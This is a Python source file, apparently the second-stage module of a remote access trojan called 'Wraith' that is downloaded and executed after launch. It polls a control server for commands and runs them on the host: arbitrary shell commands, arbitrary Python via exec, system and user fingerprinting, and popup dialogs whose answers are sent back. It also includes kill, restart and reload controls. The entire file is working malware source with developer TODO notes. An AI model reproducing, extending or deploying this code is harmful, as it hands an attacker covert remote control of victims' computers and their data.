#
# Additional file for the wraith to download and execute following a successful launch
#

# Some init for the command functions
# Define a list of commands for `help`
commands = [
    ["help","Print all commands or show help about one command.\n Args: [command]\n Format: help [command]"],
    ["exec","Executes commands on the OS.\n Args: <command>\n Format: exec <command>"],
    ["execpy","Executes python3 code.\n Args: <code>\n Format: execpy <code>"],
    ["info","Show info about OS and hardware.\n Args: None\n Format: info"],
    ["msgbx","Display tk messagebox to user and get their reply.\n Args: <info/warning/error/yesno> <title> <message>\n Format: msgbx <info/warning/error/yesno> | <title> | <message>"],
    ["say", "Say something using TTS.\n Args: <string to say>\n Format: say <text>"],
    ["webopen", "Open a link in default browser.\n Args: <link>\n Format: webopen <link>"],
    ["playsound", "Play a sound from the internet.\n Args: <sound URL>\n Format: playsound <sound URL>"],
    ["reload", "Reload the config and re-fetch the code from the server. Also, log out and log back in.\n Args: None\n Format: reload"],
    ["restart", "Restart wraith process and reconnect (if the file is in the same location).\n Args: None\n Format: restart"],
    ["die", "Kill wraith process.\n Args: None\n Format: die"],
]
# Initialise TTS engine for `say`
try:
    ttsengine = pyttsx3.init()
    ttsengine.setProperty("volume",1.0)
except: pass
# Hide tkinter window for msgbx
Tk().withdraw()

### COMMAND FUNCTIONS ###
# The help command
def DO_help(cmd):
    if cmd == "help":
        help_menu = "Wraith v{} command list:\nNOTE: Arguments in [square brackets] are not required.".format(WRAITH_VERSION)
        for command in commands:
            help_menu += "\n"+str(commands.index(command)+1)+") "+command[0]+" - "+command[1]
        return_val = help_menu
    else:
        cmd = cmd.replace("help ","",1)
        return_val = "ERR: This command is unrecognised!"
        for command in commands:
            if command[0] == cmd.strip():
                return_val = "{} - {}".format(command[0],command[1])
                break
    return return_val

# The exec command
def DO_exec(cmd):
    command_return_val = psutil.Popen(cmd.replace("exec ","",1).split(" "), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    return_val = "Code executed successfully! Result:\n\n"+str(command_return_val.stdout.read(65536).decode()).strip()
    return return_val

# The execpy command
def DO_execpy(cmd):
    tmp = BytesIO()
    with stdout_redirector(tmp): exec(cmd.replace("execpy ","",1))
    return_val = "Code executed successfully! Result:\n{}".format(tmp.getvalue().decode())
    return return_val

# The info command
def DO_info(cmd):
    current_process = psutil.Process()
    system_info = {
    "wraith_version": WRAITH_VERSION,
    "wraith_fingerprint": FINGERPRINT,
    "system_name": platform.node(),
    "os": platform.system(),
    "os_version": platform.version(),
    "architecture": platform.architecture(),
    "system_time": str(datetime.now()),
    "working_dir": os.getcwd(),
    "cpu_usage": psutil.cpu_percent(interval=1),
    "physical_cpu_cores": psutil.cpu_count(logical=False),
    "total_ram": psutil.virtual_memory().total,
    "free_ram": psutil.virtual_memory().free,
    "wraith_host_user": current_process.username(),
    "wraith_start_time": datetime.fromtimestamp(current_process.create_time()).strftime("%H:%M:%S %Y-%m-%d"),
    "process_priority": current_process.nice(),
    }
    system_info_string = "Wraith Version: v{}\nWraith Fingerprint: {}\nSystem Name: {}\nOS: {}\nOS Version: {}\nArchitecture: {}\nSystem Time: {}\nCPU Usage: {}%\nPhysical CPU Cores: {}\nTotal RAM: {}\nFree RAM: {}\nWraith Host User: {}\nWraith Start Time: {}\nWraith Process Priority: {}".format(str(system_info["wraith_version"]).strip(),str(system_info["wraith_fingerprint"]).strip(),str(system_info["system_name"]).strip(),str(system_info["os"]).strip(),str(system_info["os_version"]).strip(),str(system_info["architecture"]).strip(),str(system_info["system_time"]).strip(),str(system_info["cpu_usage"]).strip(),str(system_info["physical_cpu_cores"]).strip(),str(system_info["total_ram"]).strip(),str(system_info["free_ram"]).strip(),str(system_info["wraith_host_user"]).strip(),str(system_info["wraith_start_time"]).strip(),str(system_info["process_priority"]).strip())
    return_val = system_info_string
    return return_val

# The msgbx command
def DO_msgbx(cmd):
    args = cmd.replace("msgbx ","",1).split(" | ")
    if len(args) != 3: return_val = "ERR: 3 arguments are required: <type>, <title> and <message>!"
    if args[0] == "info": user_reaction = messagebox.showinfo(args[1],args[2])
    elif args[0] == "warning": user_reaction = messagebox.showwarning(args[1],args[2])
    elif args[0] == "error": user_reaction = messagebox.showerror(args[1],args[2])
    elif args[0] == "yesno": user_reaction = messagebox.askquestion(args[1],args[2])
    else: return_val = "ERR: Invalid type of messagebox!"
    return_val = "Successfully displayed messagebox! User replied with: {}.".format(user_reaction)
    return return_val

# The say command
def DO_say(cmd):
    ttsengine.say(cmd.replace("say ","",1))
    ttsengine.runAndWait()
    return_val = "Successfully said text!"
    return return_val

# The webopen command
def DO_webopen(cmd):
    cmd = cmd.replace("webopen ","",1)
    if not "//" in cmd: cmd = "http://"+cmd
    webopen(cmd,new=0,autoraise=True)
    return_val = "Successfully opened tab!"
    return return_val

# The playsound command
def DO_playsound(cmd):
    playsound.playsound(cmd.replace("playsound ","",1))
    return_val = "Successfully played sound!"
    return return_val

# A class to create killable thread instances using trace
class KillableThread(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False
    def start(self):
        self.__run_backup = self.run
        self.run = self.__run
        threading.Thread.start(self)
    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup
    def globaltrace(self, frame, event, arg):
        if event == 'call': return self.localtrace
        else: return None
    def localtrace(self, frame, event, arg):
        if self.killed:
            if event == 'line': raise SystemExit()
        return self.localtrace
    def kill(self): self.killed = True

# A function to execute a command in the background to ensure that the main execution thread can always accept commands
def command_background_runner(command_string): exec(command_string)

# A function to loop over the command queue and execute commands
def command_execution_function():
    global command_queue

    # Main part of thread to go over commands and execute them
    while True:
        if len(command_queue) == 0: continue
        current_command_queue = command_queue.copy()
        for cmd in current_command_queue:
            cmd = cmd.strip()
            cmd_keyword = cmd.split(" ")[0]
            result = "None"
            try:
                if "DO_"+cmd_keyword in globals() and type(globals()["DO_"+cmd_keyword]) == type(lambda: 0):
                    exec("result = DO_{}(cmd)".format(cmd_keyword))
                else: result = "ERR: Command is not recognised!"
            except Exception as err: result = "ERR: {}".format(err)
            finally:
                sendw("response",{"X-TOKEN":TOKEN,"X-MESSAGE":"[{}] Executed \"{}\"\n{}".format(FINGERPRINT,cmd,str(result))},TOKEN)
                try: command_queue.remove(cmd)
                except ValueError: pass

command_execution_thread = KillableThread(target=command_execution_function)
command_execution_thread.start()

while True:
    try:
        status, data, message=sendw("getqueue",{"X-TOKEN":TOKEN},TOKEN)
        if status != 0:
            status, data, message=sendw("login",{},FINGERPRINT)
            TOKEN = str(data)
        else:
            for command in data:
                try:
                    command = str(command)
                    # Special commands which run outside of the thread as they manage either the thread or the entire program
                    if command == "die":
                        sendw("response",{"X-TOKEN":TOKEN,"X-MESSAGE":"[{}] I'm dying!".format(FINGERPRINT)},TOKEN)
                        sendw("logout",{"X-TOKEN":TOKEN},TOKEN)
                        command_execution_thread.kill()
                        command_execution_thread.join()
                        psutil.Process().terminate()
                    elif command == "restart":
                        if os.path.isfile(__file__):
                            command_execution_thread.kill()
                            command_execution_thread.join()
                            os.execv(__file__, sys.argv)
                        else: raise OSError("The wraith file was not found so restart not attempted!")
                    elif command == "reload":
                        sendw("response",{"X-TOKEN":TOKEN,"X-MESSAGE":"[{}] Reloading code and config.".format(FINGERPRINT)},TOKEN)
                        command_execution_thread.kill()
                        command_execution_thread.join()
                        update_config()
                        sendw("logout",{"X-TOKEN":TOKEN},TOKEN)
                        raise ReloadWraith
                    else: command_queue.append(command)
                except ReloadWraith: raise ReloadWraith
                except Exception as err: sendw("response",{"X-TOKEN":TOKEN,"X-MESSAGE":"[{}] Error while trying to execute command \"{}\":\n{}".format(FINGERPRINT,command,err)},TOKEN)
    except ReloadWraith: raise ReloadWraith # Re-raise to be caught by parent loop
    except SystemExit: raise SystemExit
    except: pass
    time.sleep(2)

# TODO: fix result of command
# TODO: `help` get command list and info automatically
# TODO: Cleaner output on server
# TODO: fix exec (Command output and work with cmd disabled)
# TODO: fix execpy (Command output)
# TODO: fix say (Instant feedback and commands while saying)
